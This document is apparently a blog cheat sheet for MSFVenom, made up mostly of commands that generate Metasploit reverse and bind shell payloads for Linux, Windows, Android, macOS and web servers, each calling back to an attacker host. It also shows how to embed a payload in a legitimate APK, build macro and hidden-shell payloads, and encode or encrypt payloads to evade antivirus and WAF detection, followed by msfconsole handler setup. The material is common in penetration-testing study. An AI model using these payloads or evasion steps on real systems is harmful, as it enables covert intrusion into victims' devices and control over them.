MSFVenom Cheat Sheet  
List all available MSFVenom payloads  
Here I described the most useful MSFVenom commands and payloads in this MSFVenom cheat sheet. You can list all the payloads using the following command.  
  
$ msfvenom -l payloads  
  
Framework Payloads (562 total) [--payload ]  
==================================================  
  
    Name                                                Description  
    ----                                                -----------  
    aix/ppc/shell_bind_tcp                              Listen for a connection and spawn a command shell  
    android/meterpreter/reverse_http                    Run a meterpreter server in Android. Tunnel communication over HTTP  
    android/meterpreter/reverse_tcp                     Run a meterpreter server in Android. Connect back stager  
    apple_ios/aarch64/shell_reverse_tcp                 Connect back to attacker and spawn a command shell  
    cmd/unix/bind_netcat                                Listen for a connection and spawn a command shell via netcat  
    java/jsp_shell_reverse_tcp                          Connect back to attacker and spawn a command shell  
    java/shell/reverse_tcp                              Spawn a piped command shell (cmd.exe on Windows, /bin/sh everywhere else). Connect back stager  
    linux/x64/meterpreter/reverse_tcp                   Inject the mettle server payload (staged). Connect back to the attacker  
    linux/x64/shell/bind_tcp                            Spawn a command shell (staged). Listen for a connection  
    linux/x86/meterpreter/reverse_tcp                   Inject the mettle server payload (staged). Connect back to the attacker  
    nodejs/shell_reverse_tcp                            Creates an interactive shell via nodejs  
    osx/armle/shell/reverse_tcp                         Spawn a command shell (staged). Connect back to the attacker  
    osx/armle/shell_bind_tcp                            Listen for a connection and spawn a command shell  
    osx/x64/meterpreter/reverse_tcp                     Inject the mettle server payload (staged). Connect, read length, read buffer, execute  
    php/meterpreter/bind_tcp                            Run a meterpreter server in PHP. Listen for a connection  
    php/meterpreter/reverse_tcp                         Run a meterpreter server in PHP. Reverse PHP connect back stager with checks for disabled functions  
    python/meterpreter/bind_tcp                         Run a meterpreter server in Python (2.5-2.7 & 3.1-3.6). Listen for a connection  
    python/meterpreter/reverse_http                     Run a meterpreter server in Python (2.5-2.7 & 3.1-3.6). Tunnel communication over HTTP  
    ruby/shell_reverse_tcp                              Connect back and create a command shell via Ruby  
    windows/dllinject/reverse_tcp_allports              Inject a DLL via a reflective loader. Try to connect back to the attacker, on all possible ports (1-65535, slowly)  
    windows/meterpreter/bind_tcp                        Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Listen for a connection (Windows x86)  
    windows/meterpreter/reverse_tcp                     Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Connect back to the attacker  
    windows/x64/meterpreter/reverse_tcp                 Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged x64). Connect back to the attacker (Windows x64)  
    windows/x64/meterpreter/reverse_http                Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged x64). Tunnel communication over HTTP (Windows x64 wininet)  
...  
Here we will consider,  
  
LHOST = 10.10.10.10, RHOST = 12.12.12.12, LPORT = 4545  
  
Meterpreter Reverse Shells  
Linux Reverse Shells  
# x86  
$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4545 -f elf > shell.elf  
  
# x64  
$ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4545 -f elf > shell.elf  
  
# x86 Reverse HTTP  
$ msfvenom -p linux/x86/meterpreter_reverse_http LHOST=10.10.10.10 LPORT=4545 -f elf > shell.elf  
  
# x64 Reverse HTTP  
$ msfvenom -p linux/x64/meterpreter_reverse_http LHOST=10.10.10.10 LPORT=4545 -f elf > shell.elf  
Windows Reverse Shells  
# x86 normal  
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4545 -f exe > shell.exe  
  
# x64 (CMD Single Stage)  
$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4545 -f exe > shell.exe  
  
# reverse HTTP  
$ msfvenom -p windows/meterpreter/reverse_http LHOST=10.10.10.10 LPORT=4545 -f exe > shell.exe  
  
# reverse HTTPS  
$ msfvenom -p windows/meterpreter/reverse_https LHOST=10.10.10.10 LPORT=4545 -f exe > shell.exe  
  
# Powershell Payload  
$ msfvenom -p cmd/windows/reverse_powershell LHOST=10.10.10.10 LPORT=4545 > shell.bat  
  
# Macro Payload  
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4545 -f vba  
Android Reverse Shells  
$ msfvenom -p android/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4545 R > shell.apk  
  
# Android Embed Payload with another apk  
$ msfvenom -x anyApp.apk android/meterpreter/reverse_tcp lhost=10.10.10.10 lport=4545 -o shell.apk  
  
# Reverse HTTP  
$ msfvenom -p android/meterpreter/reverse_http LHOST=10.10.10.10 LPORT=4545 R > shell.apk  
  
# Reverse HTTPS  
$ msfvenom -p android/meterpreter/reverse_https LHOST=10.10.10.10 LPORT=4545 R > shell.apk  
macOS Reverse Shells  
$ msfvenom -p osx/x86/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4545 -f macho > shell.macho  
  
# Reverse TCP Shellcode  
$ msfvenom -p osx/x86/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4545 -f < platform  
Meterpreter Bind Shells  
Linux Bind Shell  
# x86 (multi stage)  
$ msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=12.12.12.12 LPORT=4545 -f elf > shell.elf  
  
# x64 (single stage)  
$ msfvenom -p linux/x64/shell_bind_tcp RHOST=12.12.12.12 LPORT=4545 -f elf > shell.elf  
Windows Bind Shell  
$ msfvenom -p windows/meterpreter/bind_tcp RHOST=12.12.12.12 LPORT=4545 -f exe > bind.exe  
  
# Hidden Bind TCP Payload  
$ msfvenom -p windows/shell_hidden_bind_tcp RHOST=12.12.12.12 LPORT=4545 -f exe > hidden_shell.exe  
macOS Bind Shell  
$ msfvenom -p osx/x86/shell_bind_tcp RHOST=12.12.12.12 LPORT=4545 -f macho > shell.macho  
Meterpreter Web Payloads  
PHP Meterpreter Reverse Shells  
$ msfvenom -p php/reverse_php LHOST=10.10.10.10 LPORT=4545 -f raw > shell.php  
  
# PHP Meterpreter Reverse TCP  
$ msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.10.10 LPORT=4545 -f raw > shell.php  
$ cat shell.php | pbcopy && echo ‘<?php ' | tr -d '\n'> shell.php && pbpaste >> shell.php  
Java JSP Meterpreter Reverse TCP  
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.10 LPORT=4545 -f raw > shell.jsp  
ASP Meterpreter Reverse TCP  
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4545 -f asp > shell.asp  
WAR Payload Shells  
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.10 LPORT=4545 -f war > shell.war  
Scripting Payloads  
Bash Unix Reverse Shell  
$ msfvenom -p cmd/unix/reverse_bash LHOST=10.10.10.10 LPORT=4545 -f raw > shell.sh  
Python Reverse Shell  
$ msfvenom -p cmd/unix/reverse_python LHOST=10.10.10.10 LPORT=4545 -f raw > shell.py  
Perl Unix Reverse shell  
$ msfvenom -p cmd/unix/reverse_perl LHOST=10.10.10.10 LPORT=4545 -f raw > shell.pl  
WAF and Antivirus Detection(AV) Bypass using MSFVenom Encoders  
The normal MSFVenom generated payloads can be easily detectable by most of the antivirus software or firewalls. MSFVenom provides one functionality called, Encoders which can be used to bypass some of them Firewalls and Antivirus software. You can take advantage of some of them for AV bypass and WAF bypass. Use -e flag to use the same with any encoder name. Encoder types are also described in the below section.  
  
$ msfvenom --platform Windows -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 LHOST=10.10.10.10 LPORT=4545 -f exe > encoded_shell.exe  
  
[-] No arch selected, selecting arch: x86 from the payload  
Found 1 compatible encoders  
Attempting to encode payload with 5 iterations of x86/shikata_ga_nai  
x86/shikata_ga_nai succeeded with size 368 (iteration=0)  
x86/shikata_ga_nai succeeded with size 395 (iteration=1)  
x86/shikata_ga_nai succeeded with size 422 (iteration=2)  
x86/shikata_ga_nai succeeded with size 449 (iteration=3)  
x86/shikata_ga_nai succeeded with size 476 (iteration=4)  
x86/shikata_ga_nai chosen with final size 476  
Payload size: 476 bytes  
Final size of exe file: 73802 bytes  
Here -i flag is used to specifying the number of iterations. Use max possible numbers to make the payload undetectable to antivirus software(AV) and WAFs.  
  
List all the Encoder types  
You can list all the encoder types available in msfvenom using –list flag with encoders option.  
  
$ msfvenom --list encoders  
  
Framework Encoders [--encoder ]  
======================================  
  
    Name                          Rank       Description  
    ----                          ----       -----------  
    cmd/brace                     low        Bash Brace Expansion Command Encoder  
    cmd/echo                      good       Echo Command Encoder  
    cmd/generic_sh                manual     Generic Shell Variable Substitution Command Encoder  
    cmd/ifs                       low        Bourne ${IFS} Substitution Command Encoder  
    cmd/perl                      normal     Perl Command Encoder  
    cmd/powershell_base64         excellent  Powershell Base64 Command Encoder  
    cmd/printf_php_mq             manual     printf(1) via PHP magic_quotes Utility Command Encoder  
    generic/eicar                 manual     The EICAR Encoder  
    generic/none                  normal     The "none" Encoder  
    mipsbe/byte_xori              normal     Byte XORi Encoder  
    mipsbe/longxor                normal     XOR Encoder  
    mipsle/byte_xori              normal     Byte XORi Encoder  
    mipsle/longxor                normal     XOR Encoder  
    php/base64                    great      PHP Base64 Encoder  
    ppc/longxor                   normal     PPC LongXOR Encoder  
    ppc/longxor_tag               normal     PPC LongXOR Encoder  
    ruby/base64                   great      Ruby Base64 Encoder  
    sparc/longxor_tag             normal     SPARC DWORD XOR Encoder  
    x64/xor                       normal     XOR Encoder  
    x64/xor_context               normal     Hostname-based Context Keyed Payload Encoder  
    x64/xor_dynamic               normal     Dynamic key XOR Encoder  
    x64/zutto_dekiru              manual     Zutto Dekiru  
    x86/add_sub                   manual     Add/Sub Encoder  
    x86/alpha_mixed               low        Alpha2 Alphanumeric Mixedcase Encoder  
    x86/alpha_upper               low        Alpha2 Alphanumeric Uppercase Encoder  
    x86/avoid_underscore_tolower  manual     Avoid underscore/tolower  
    x86/avoid_utf8_tolower        manual     Avoid UTF8/tolower  
    x86/bloxor                    manual     BloXor - A Metamorphic Block Based XOR Encoder  
    x86/bmp_polyglot              manual     BMP Polyglot  
    x86/call4_dword_xor           normal     Call+4 Dword XOR Encoder  
    x86/context_cpuid             manual     CPUID-based Context Keyed Payload Encoder  
    x86/context_stat              manual     stat(2)-based Context Keyed Payload Encoder  
    x86/context_time              manual     time(2)-based Context Keyed Payload Encoder  
    x86/countdown                 normal     Single-byte XOR Countdown Encoder  
    x86/fnstenv_mov               normal     Variable-length Fnstenv/mov Dword XOR Encoder  
    x86/jmp_call_additive         normal     Jump/Call XOR Additive Feedback Encoder  
    x86/nonalpha                  low        Non-Alpha Encoder  
    x86/nonupper                  low        Non-Upper Encoder  
    x86/opt_sub                   manual     Sub Encoder (optimised)  
    x86/service                   manual     Register Service  
    x86/shikata_ga_nai            excellent  Polymorphic XOR Additive Feedback Encoder  
    x86/single_static_bit         manual     Single Static Bit  
    x86/unicode_mixed             manual     Alpha2 Alphanumeric Unicode Mixedcase Encoder  
    x86/unicode_upper             manual     Alpha2 Alphanumeric Unicode Uppercase Encoder  
    x86/xor_dynamic               normal     Dynamic key XOR Encoder  
Among these, “x86/shikata_ga_nai” is the most useful and excellent polymorphic XOR addictive encoder.  
  
List Payload Options  
Here I described the most useful MSFVenom command to view the detailed description of the payload in this MSFVenom cheat sheet. Refer to the detailed view before generating the payload which will give an idea about the payload. Use flag –list-options for the same.  
  
# msfvenom -p PAYLOAD --list-options  
$ msfvenom -p linux/x86/meterpreter/reverse_tcp --list-options  
  
Options for payload/linux/x86/meterpreter/reverse_tcp:  
=========================  
  
  
       Name: Linux Mettle x86, Reverse TCP Stager  
     Module: payload/linux/x86/meterpreter/reverse_tcp  
   Platform: Linux, Linux  
       Arch: x86  
Needs Admin: No  
 Total size: 245  
       Rank: Normal  
  
Basic options:  
Name   Current Setting  Required  Description  
----   ---------------  --------  -----------  
LHOST                   yes       The listen address (an interface may be specified)  
LPORT  4444             yes       The listen port  
  
Description:  
  Inject the mettle server payload (staged). Connect back to the   
  attacker  
  
Advanced options for payload/linux/x86/meterpreter/reverse_tcp:  
=========================  
  
    Name                         Current Setting  Required  Description  
    ----                         ---------------  --------  -----------  
    AppendExit                   false            no        Append a stub that executes the exit(0) system call  
    AutoLoadStdapi               true             yes       Automatically load the Stdapi extension  
    AutoRunScript                                 no        A script to run automatically on session creation.  
    AutoSystemInfo               true             yes       Automatically capture system information on initialization.  
    AutoUnhookProcess            false            yes       Automatically load the unhook extension and unhook the process  
    AutoVerifySession            true             yes       Automatically verify and drop invalid sessions  
    AutoVerifySessionTimeout     30               no        Timeout period to wait for session validation to occur, in seconds  
    EnableStageEncoding          false            no        Encode the second stage payload  
    EnableUnicodeEncoding        false            yes       Automatically encode UTF-8 strings as hexadecimal  
    HandlerSSLCert                                no        Path to a SSL certificate in unified PEM format, ignored for HTTP transports  
    InitialAutoRunScript                          no        An initial script to run on session creation (before AutoRunScript)  
    MeterpreterDebugLevel        0                yes       Set debug level for meterpreter 0-3 (Default output is strerr)  
    PayloadProcessCommandLine                     no        The displayed command line that will be used by the payload  
    PayloadUUIDName                               no        A human-friendly name to reference this unique payload (requires tracking)  
    PayloadUUIDRaw                                no        A hex string representing the raw 8-byte PUID value for the UUID  
    PayloadUUIDSeed                               no        A string to use when generating the payload UUID (deterministic)  
    PayloadUUIDTracking          false            yes       Whether or not to automatically register generated UUIDs  
    PingbackRetries              0                yes       How many additional successful pingbacks  
    PingbackSleep                30               yes       Time (in seconds) to sleep between pingbacks  
    PrependChrootBreak           false            no        Prepend a stub that will break out of a chroot (includes setreuid to root)  
    PrependFork                  false            no        Prepend a stub that executes: if (fork()) { exit(0); }  
    PrependSetgid                false            no        Prepend a stub that executes the setgid(0) system call  
    PrependSetregid              false            no        Prepend a stub that executes the setregid(0, 0) system call  
    PrependSetresgid             false            no        Prepend a stub that executes the setresgid(0, 0, 0) system call  
    PrependSetresuid             false            no        Prepend a stub that executes the setresuid(0, 0, 0) system call  
    PrependSetreuid              false            no        Prepend a stub that executes the setreuid(0, 0) system call  
    PrependSetuid                false            no        Prepend a stub that executes the setuid(0) system call  
    RemoteMeterpreterDebugFile                    no        Redirect Debug Info to a Log File  
    ReverseAllowProxy            false            yes       Allow reverse tcp even with Proxies specified. Connect back will NOT go through proxy but directly to LHOST  
    ReverseListenerBindAddress                    no        The specific IP address to bind to on the local system  
    ReverseListenerBindPort                       no        The port to bind to on the local system if different from LPORT  
    ReverseListenerComm                           no        The specific communication channel to use for this listener  
    ReverseListenerThreaded      false            yes       Handle every connection in a new thread (experimental)  
    SessionCommunicationTimeout  300              no        The number of seconds of no activity before this session should be killed  
    SessionExpirationTimeout     604800           no        The number of seconds before this session should be forcibly shut down  
    SessionRetryTotal            3600             no        Number of seconds try reconnecting for on network failure  
    SessionRetryWait             10               no        Number of seconds to wait between reconnect attempts  
    StageEncoder                                  no        Encoder to use if EnableStageEncoding is set  
    StageEncoderSaveRegisters                     no        Additional registers to preserve in the staged payload if EnableStageEncoding is set  
    StageEncodingFallback        true             no        Fallback to no encoding if the selected StageEncoder is not compatible  
    StagerRetryCount             10               no        The number of times the stager should retry if the first connect fails  
    StagerRetryWait              5                no        Number of seconds to wait for the stager between reconnect attempts  
    VERBOSE                      false            no        Enable detailed status messages  
    WORKSPACE                                     no        Specify the workspace for this module  
  
Evasion options for payload/linux/x86/meterpreter/reverse_tcp:  
=========================  
  
    Name  Current Setting  Required  Description  
    ----  ---------------  --------  -----------  
List all Platforms  
You can specify the platform for the payload using –platform flag. Choose any of the following for your target system for the payload generation. In this MSFVenom cheat sheet, I specified the methods to view all the available options to choose from, which will help you to get more ideas about the uses of MSFVenom.  
  
$ msfvenom --list platforms  
  
Framework Platforms [--platform ]  
========================================  
  
    Name  
    ----  
    aix  
    android  
    apple_ios  
    brocade  
    bsd  
    bsdi  
    cisco  
    firefox  
    freebsd  
    hardware  
    hpux  
    irix  
    java  
    javascript  
    juniper  
    linux  
    mainframe  
    multi  
    netbsd  
    netware  
    nodejs  
    openbsd  
    osx  
    php  
    python  
    r  
    ruby  
    solaris  
    unifi  
    unix  
    unknown  
    windows  
List all Payload Formats  
Choose any of the following for the output format of the payload. Specify –format with the option any from below when generating the payload.  
  
$ msfvenom --list formats  
  
Framework Executable Formats [--format ]  
===============================================  
  
    Name  
    ----  
    asp  
    aspx  
    aspx-exe  
    axis2  
    dll  
    elf  
    elf-so  
    exe  
    exe-only  
    exe-service  
    exe-small  
    hta-psh  
    jar  
    jsp  
    loop-vbs  
    macho  
    msi  
    msi-nouac  
    osx-app  
    psh  
    psh-cmd  
    psh-net  
    psh-reflection  
    vba  
    vba-exe  
    vba-psh  
    vbs  
    war  
  
Framework Transform Formats [--format ]  
==============================================  
  
    Name  
    ----  
    bash  
    c  
    csharp  
    dw  
    dword  
    hex  
    java  
    js_be  
    js_le  
    num  
    perl  
    pl  
    powershell  
    ps1  
    py  
    python  
    raw  
    rb  
    ruby  
    sh  
    vbapplication  
    vbscript  
Output Payload Architecture  
You can specify the framework architecture for the payload using the archs available in this MSFVenom cheat sheet. Use -a to specify the arch for the output payload.  
  
$ msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4545 -f exe > shell.exe  
  
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload  
No encoder or badchars specified, outputting raw payload  
 Payload size: 341 bytes  
Final size of exe file: 73802 bytes  
List all the archs  
$ msfvenom --list archs  
  
Framework Architectures [--arch ]  
========================================  
  
    Name  
    ----  
    aarch64  
    armbe  
    armle  
    cbea  
    cbea64  
    cmd  
    dalvik  
    firefox  
    java  
    mips  
    mips64  
    mips64le  
    mipsbe  
    mipsle  
    nodejs  
    php  
    ppc  
    ppc64  
    ppc64le  
    ppce500v2  
    python  
    r  
    ruby  
    sparc  
    sparc64  
    tty  
    x64  
    x86  
    x86_64  
    zarch  
Payloads with Encryptions  
You can encrypt the payloads using some of the encryption methods available in MSFVenom. Use –encrypt flag to make the payload encrypted or encoded. You can also make the payload undetectable by the AVs and WAFs by encrypting the payload.  
  
$ msfvenom --encrypt aes256 -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4545 -f exe > shell.exe  
  
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload  
[-] No arch selected, selecting arch: x86 from the payload  
No encoder or badchars specified, outputting raw payload  
Payload size: 341 bytes  
Final size of exe file: 73802 bytes  
List of Encrypt methods  
$ msfvenom --list encrypt  
  
Framework Encryption Formats [--encrypt ]  
================================================  
  
    Name  
    ----  
    aes256  
    base64  
    rc4  
    xor  
How to Use these Paylaods in MSFConsole  
You can get the connect to the target machine using msfconsole and metasploit handler.  
  
# msfconsole commands  
msf> use exploit/multi/handler  
msf> set PAYLOAD  
msf> set RHOST  
msf> set LHOST  
msf> set LPORT  
msf> exploit -j